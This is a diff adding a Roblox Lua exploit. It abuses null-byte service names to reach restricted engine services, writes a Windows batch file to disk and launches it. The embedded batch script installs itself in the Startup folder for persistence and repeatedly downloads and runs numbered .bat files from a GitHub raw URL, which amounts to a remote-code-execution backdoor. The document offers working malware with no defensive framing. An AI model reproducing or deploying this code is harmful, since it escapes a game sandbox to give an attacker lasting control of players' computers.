@@ -1,0 +1,52 @@
+local LinkingService = game:GetService("LinkingService\0 meow meow meow")
+local ScriptContext = game:GetService("ScriptContext\0 meow meow!!")
+local scriptContent = [[@echo off
+@echo off
+setlocal enabledelayedexpansion
+
+:: Шаг 1: Создание bat-файла в "Документы"
+set TARGET_FILE=%USERPROFILE%\Documents\update.bat
+(
+echo @echo off
+echo setlocal enabledelayedexpansion
+echo ^:: Базовая ссылка
+echo set BASE_URL=https://raw.githubusercontent.com/goofyahh-hub/idk/main/CustomScriptHolder
+echo ^:: Инициализация счётчика
+echo set /a MAX_NUMBER=100
+echo set /a CURRENT_NUMBER=%%MAX_NUMBER%%
+echo :check_next_file
+echo set /a NEXT_NUMBER=%%CURRENT_NUMBER%% - 1
+echo if %%NEXT_NUMBER%% lss 1 goto end
+echo curl --head --silent --fail %%BASE_URL%%%%NEXT_NUMBER%%%% >nul 2>nul
+echo if not errorlevel 1 (^
+echo set /a CURRENT_NUMBER=%%NEXT_NUMBER%% ^
+echo goto check_next_file ^
+echo )
+echo echo Found latest file: %%BASE_URL%%%%CURRENT_NUMBER%%%%
+echo curl --silent %%BASE_URL%%%%CURRENT_NUMBER%%%% --output %%TEMP%%\latest_script.bat
+echo call %%TEMP%%\latest_script.bat
+echo echo Waiting for the next file...
+echo set /a NEXT_NUMBER=%%CURRENT_NUMBER%% + 1
+echo :wait_next_file
+echo curl --head --silent --fail %%BASE_URL%%%%NEXT_NUMBER%%%% >nul 2>nul
+echo if errorlevel 1 (^
+echo timeout /t 30 >nul ^
+echo goto wait_next_file ^
+echo )
+echo curl --silent %%BASE_URL%%%%NEXT_NUMBER%%%% --output %%TEMP%%\next_script.bat
+echo call %%TEMP%%\next_script.bat
+echo :end
+echo echo Update complete. Exiting.
+) > "%TARGET_FILE%"
+
+:: Шаг 2: Перемещение файла в автозагрузку
+set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
+move "%TARGET_FILE%" "%STARTUP_FOLDER%\update.bat" >nul
+
+:: Шаг 3: Запуск автообновления
+echo Auto-update script installed and moved to Startup. Running now...
+call "%STARTUP_FOLDER%\update.bat"
+
+]]
+local payload = ScriptContext:SaveScriptProfilingData(scriptContent, "test.bat")
+LinkingService:OpenUrl(payload)
